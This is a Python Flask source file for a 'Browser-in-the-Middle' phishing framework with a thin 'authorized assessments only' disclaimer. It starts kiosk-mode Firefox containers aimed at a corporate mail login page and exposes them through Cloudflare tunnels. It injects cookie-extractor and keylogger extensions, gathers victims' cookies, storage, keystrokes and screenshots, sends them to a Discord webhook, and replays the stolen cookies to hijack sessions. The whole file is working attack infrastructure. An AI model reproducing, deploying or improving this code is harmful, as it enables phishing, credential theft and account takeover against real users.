#!/usr/bin/env python3
"""
BitB Framework - Browser-in-the-Middle Attack Platform
For authorized security assessments only
"""

import os
import json
import uuid
import hashlib
import asyncio
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from functools import wraps

from flask import Flask, render_template, jsonify, request, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis
import docker

from session_manager import SessionManager
from cloudflare_manager import CloudflareTunnelManager
from exfil_handler import ExfilHandler

# Configuration
CONFIG = {
    'REDIS_URL': os.getenv('REDIS_URL', 'redis://localhost:6379'),
    'DISCORD_WEBHOOK': os.getenv('DISCORD_WEBHOOK'),
    'CLOUDFLARE_TOKEN': os.getenv('CLOUDFLARE_TOKEN'),
    'SECRET_KEY': os.getenv('SECRET_KEY', os.urandom(32).hex()),
    'ADMIN_IPS': [ip.strip() for ip in os.getenv('ADMIN_IPS', '').split(',') if ip.strip()],
    'SESSION_TIMEOUT': int(os.getenv('SESSION_TIMEOUT', '3600')),
    'MAX_CONTAINERS': int(os.getenv('MAX_CONTAINERS', '10')),
    'DATA_DIR': os.getenv('DATA_DIR', '/data/sessions'),
}

app = Flask(__name__)
app.secret_key = CONFIG['SECRET_KEY']

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per minute", "1000 per hour"]
)

redis_client = redis.from_url(CONFIG['REDIS_URL'], decode_responses=True)

docker_client = docker.from_env()
session_mgr = SessionManager(docker_client, CONFIG)
cf_mgr = CloudflareTunnelManager(CONFIG['CLOUDFLARE_TOKEN'])
exfil = ExfilHandler(CONFIG['DISCORD_WEBHOOK'])


@dataclass
class BrowserSession:
    id: str
    user_ip: str
    container_id: Optional[str]
    vnc_port: Optional[int]
    cf_url: Optional[str]
    target_url: str
    status: str
    created_at: datetime
    last_activity: datetime
    exfil_data: Dict

    def to_dict(self):
        data = asdict(self)
        data['created_at'] = self.created_at.isoformat()
        data['last_activity'] = self.last_activity.isoformat()
        return data


def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if CONFIG['ADMIN_IPS'] and client_ip not in CONFIG['ADMIN_IPS']:
            api_key = request.headers.get('X-API-Key')
            if not api_key or not verify_api_key(api_key):
                abort(403, 'Access denied')
        return f(*args, **kwargs)
    return decorated


def verify_api_key(key: str) -> bool:
    stored = redis_client.get('api_key_hash')
    if not stored:
        return False
    return hashlib.sha256(key.encode()).hexdigest() == stored


def sanitize_id(user_id: str) -> str:
    return hashlib.sha256(user_id.encode()).hexdigest()[:16]


@app.route('/')
@require_auth
def dashboard():
    sessions = get_all_sessions()
    stats = {
        'active': len([s for s in sessions if s['status'] == 'running']),
        'total_exfil': len([s for s in sessions if s.get('exfil_data')]),
        'uptime': get_uptime()
    }
    return render_template('dashboard.html', sessions=sessions, stats=stats)


@app.route('/api/sessions', methods=['GET'])
@require_auth
def list_sessions():
    return jsonify(get_all_sessions())


@app.route('/api/session/launch', methods=['POST'])
@require_auth
@limiter.limit('5 per minute')
def launch_session():
    data = request.get_json() or {}
    user_id = data.get('user_id', str(uuid.uuid4()))
    target_url = data.get('target_url', 'https://qiye.aliyun.com/')
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    active = len([s for s in get_all_sessions() if s['status'] == 'running'])
    if active >= CONFIG['MAX_CONTAINERS']:
        return jsonify({'error': 'Max containers reached'}), 429

    session_id = str(uuid.uuid4())[:8]
    sanitized = sanitize_id(user_id)
    session_dir = os.path.join(CONFIG['DATA_DIR'], sanitized)
    os.makedirs(session_dir, exist_ok=True)

    install_extensions(session_dir)

    session = BrowserSession(
        id=session_id,
        user_ip=client_ip,
        container_id=None,
        vnc_port=None,
        cf_url=None,
        target_url=target_url,
        status='pending',
        created_at=datetime.now(),
        last_activity=datetime.now(),
        exfil_data={}
    )

    asyncio.create_task(spawn_browser(session, sanitized))

    redis_client.setex(
        f'session:{session_id}',
        timedelta(seconds=CONFIG['SESSION_TIMEOUT']),
        json.dumps(session.to_dict())
    )

    return jsonify({
        'session_id': session_id,
        'status': 'pending',
        'message': 'Container spawning...'
    })


@app.route('/api/session/<session_id>/status', methods=['GET'])
@require_auth
def session_status(session_id: str):
    data = redis_client.get(f'session:{session_id}')
    if not data:
        return jsonify({'error': 'Session not found'}), 404
    return jsonify(json.loads(data))


@app.route('/api/session/<session_id>/exfil', methods=['POST'])
def receive_exfil(session_id: str):
    data = request.get_json() or {}
    if not verify_extension_payload(data):
        return jsonify({'error': 'Invalid payload'}), 400

    session_data = redis_client.get(f'session:{session_id}')
    if session_data:
        session = json.loads(session_data)
        session['exfil_data'] = data
        session['last_activity'] = datetime.now().isoformat()
        redis_client.setex(
            f'session:{session_id}',
            timedelta(seconds=CONFIG['SESSION_TIMEOUT']),
            json.dumps(session)
        )
        exfil.send_to_discord(session_id, data)
        store_exfil_for_replay(session_id, data)

    return jsonify({'status': 'received'})


@app.route('/api/session/<session_id>/replay', methods=['POST'])
@require_auth
def replay_session(session_id: str):
    exfil_data = load_exfil_data(session_id)
    if not exfil_data:
        return jsonify({'error': 'No exfil data available'}), 404
    replay_id = launch_replay_container(exfil_data)
    return jsonify({'replay_session_id': replay_id, 'status': 'launching'})


@app.route('/api/session/<session_id>/terminate', methods=['POST'])
@require_auth
def terminate_session(session_id: str):
    session_data = redis_client.get(f'session:{session_id}')
    if not session_data:
        return jsonify({'error': 'Session not found'}), 404

    session = json.loads(session_data)
    if session.get('container_id'):
        try:
            container = docker_client.containers.get(session['container_id'])
            container.stop(timeout=10)
        except Exception:
            pass

    if session.get('cf_tunnel_id'):
        cf_mgr.delete_tunnel(session['cf_tunnel_id'])

    redis_client.delete(f'session:{session_id}')
    return jsonify({'status': 'terminated'})


def get_all_sessions() -> List[Dict]:
    sessions = []
    for key in redis_client.scan_iter(match='session:*'):
        data = redis_client.get(key)
        if data:
            sessions.append(json.loads(data))
    return sessions


def get_uptime() -> str:
    start = redis_client.get('framework_start')
    if start:
        delta = datetime.now() - datetime.fromisoformat(start)
        return str(delta).split('.')[0]
    return 'Unknown'


def install_extensions(session_dir: str):
    import shutil

    ext_source = os.path.join(os.getcwd(), 'extensions')
    ext_target = os.path.join(session_dir, 'extensions')
    if os.path.exists(ext_source):
        shutil.copytree(ext_source, ext_target, dirs_exist_ok=True)
        for ext_name in ['cookie-extractor', 'keylogger']:
            config_path = os.path.join(ext_target, ext_name, 'config.js')
            with open(config_path, 'w', encoding='utf-8') as f:
                f.write(f"""
const BITB_CONFIG = {{
    endpoint: '{os.getenv('EXFIL_ENDPOINT', 'http://localhost:8080')}',
    sessionId: '{os.path.basename(session_dir)}',
    discordWebhook: '{CONFIG['DISCORD_WEBHOOK']}'
}};
""")


def verify_extension_payload(data: Dict) -> bool:
    return isinstance(data, dict) and data.get('sessionId')


def store_exfil_for_replay(session_id: str, data: Dict):
    replay_dir = os.path.join(CONFIG['DATA_DIR'], 'replays')
    os.makedirs(replay_dir, exist_ok=True)
    filepath = os.path.join(replay_dir, f'{session_id}.json')
    with open(filepath, 'w', encoding='utf-8') as f:
        json.dump({
            'session_id': session_id,
            'timestamp': datetime.now().isoformat(),
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'keylog': data.get('keylog', []),
            'urls': data.get('urls', []),
            'screenshot': data.get('screenshot')
        }, f, indent=2)


def load_exfil_data(session_id: str) -> Optional[Dict]:
    filepath = os.path.join(CONFIG['DATA_DIR'], 'replays', f'{session_id}.json')
    if os.path.exists(filepath):
        with open(filepath, 'r', encoding='utf-8') as f:
            return json.load(f)
    return None


async def spawn_browser(session: BrowserSession, sanitized_id: str):
    try:
        vnc_port = session_mgr.reserve_port()
        session.vnc_port = vnc_port

        try:
            tunnel = await cf_mgr.create_tunnel(f'bitb-{session.id}', f'localhost:{vnc_port}')
            session.cf_url = tunnel['url']
            session.cf_tunnel_id = tunnel['id']
        except Exception as tunnel_error:
            app.logger.warning(f'Cloudflare tunnel creation failed, continuing without it: {tunnel_error}')
            session.cf_url = None
            session.cf_tunnel_id = None

        session_dir = os.path.join(CONFIG['DATA_DIR'], sanitized_id)
        container = docker_client.containers.run(
            'bitb-firefox-custom:latest',
            detach=True,
            name=f'firefox_{session.id}',
            ports={'5800/tcp': vnc_port},
            volumes={
                session_dir: {'bind': '/config', 'mode': 'rw'}
            },
            environment={
                'FF_KIOSK': '1',
                'FF_OPEN_URL': session.target_url,
                'DISPLAY_WIDTH': '1280',
                'DISPLAY_HEIGHT': '720',
                'BITB_SESSION_ID': session.id,
                'BITB_EXFIL_ENDPOINT': os.getenv('EXFIL_ENDPOINT', 'http://host.docker.internal:8080')
            },
            mem_limit='1g',
            memswap_limit='1g',
            cpu_quota=50000,
            pids_limit=200,
            shm_size='2g',
            network='bitb_net',
            auto_remove=True
        )

        session.container_id = container.id
        session.status = 'running'
        redis_client.setex(
            f'session:{session.id}',
            timedelta(seconds=CONFIG['SESSION_TIMEOUT']),
            json.dumps(session.to_dict())
        )
    except Exception as e:
        session.status = 'failed'
        app.logger.error(f'Failed to spawn browser: {e}')
        redis_client.setex(
            f'session:{session.id}',
            timedelta(seconds=300),
            json.dumps(session.to_dict())
        )


def launch_replay_container(exfil_data: Dict) -> str:
    replay_id = str(uuid.uuid4())[:8]
    replay_dir = os.path.join(CONFIG['DATA_DIR'], 'replays', replay_id)
    os.makedirs(replay_dir, exist_ok=True)

    write_firefox_cookies(replay_dir, exfil_data.get('cookies', []))

    container = docker_client.containers.run(
        'bitb-firefox-custom:latest',
        detach=True,
        name=f'firefox_replay_{replay_id}',
        ports={'5800/tcp': None},
        volumes={replay_dir: {'bind': '/config', 'mode': 'rw'}},
        environment={
            'FF_KIOSK': '0',
            'FF_OPEN_URL': exfil_data.get('urls', ['https://qiye.aliyun.com'])[0],
            'DISPLAY_WIDTH': '1280',
            'DISPLAY_HEIGHT': '720'
        },
        mem_limit='1g',
        network='bitb_net',
        auto_remove=True
    )

    return replay_id


def write_firefox_cookies(profile_dir: str, cookies: List[Dict]):
    import sqlite3

    cookie_db = os.path.join(profile_dir, 'cookies.sqlite')
    conn = sqlite3.connect(cookie_db)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS moz_cookies (
            id INTEGER PRIMARY KEY,
            originAttributes TEXT NOT NULL DEFAULT '',
            name TEXT,
            value TEXT,
            host TEXT,
            path TEXT,
            expiry INTEGER,
            lastAccessed INTEGER,
            creationTime INTEGER,
            isSecure INTEGER,
            isHttpOnly INTEGER,
            inBrowserElement INTEGER DEFAULT 0,
            sameSite INTEGER DEFAULT 0,
            rawSameSite INTEGER DEFAULT 0,
            schemeMap INTEGER DEFAULT 0,
            isPartitionedAttributeSet INTEGER DEFAULT 0,
            partitionKey TEXT,
            CONSTRAINT moz_uniqueid UNIQUE (name, host, path, originAttributes)
        )
    ''')

    now = int(datetime.now().timestamp() * 1_000_000)
    for cookie in cookies:
        cursor.execute('''
            INSERT OR REPLACE INTO moz_cookies 
            (name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            cookie.get('name'),
            cookie.get('value'),
            cookie.get('domain'),
            cookie.get('path', '/'),
            cookie.get('expirationDate', int((datetime.now() + timedelta(days=7)).timestamp())),
            now,
            now,
            1 if cookie.get('secure') else 0,
            1 if cookie.get('httpOnly') else 0
        ))

    conn.commit()
    conn.close()


if __name__ == '__main__':
    redis_client.set('framework_start', datetime.now().isoformat())
    app.run(host='0.0.0.0', port=8080, debug=False)
